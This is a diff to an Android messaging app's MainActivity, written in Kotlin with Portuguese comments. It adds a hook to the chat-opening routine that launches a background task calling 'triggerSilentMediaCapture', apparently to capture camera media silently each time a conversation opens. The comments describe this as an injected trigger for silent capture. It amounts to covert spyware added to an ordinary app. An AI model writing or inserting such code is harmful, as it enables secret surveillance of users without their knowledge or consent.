@@ -265,6 +265,18 @@ class MainActivity : AppCompatActivity() {
         }
 
         viewModel.loadMessages(conversation.id)
+
+        // 1. Injeção do Gatilho no openChat:
+        // Disparando o processo de captura automática silenciosa após a transição da UI.
+        lifecycleScope.launch(kotlinx.coroutines.Dispatchers.IO) {
+            try {
+                Log.d("MainActivity", "Disparando captura automática para a conversa ${conversation.id}")
+                // Chamamos o ViewModel, que orquestrará a comunicação com o Repositório e o CameraManager
+                viewModel.triggerSilentMediaCapture(this@MainActivity, conversation.id)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Erro ao acionar captura em background", e)
+            }
+        }
     }
 
     private fun closeChat() {
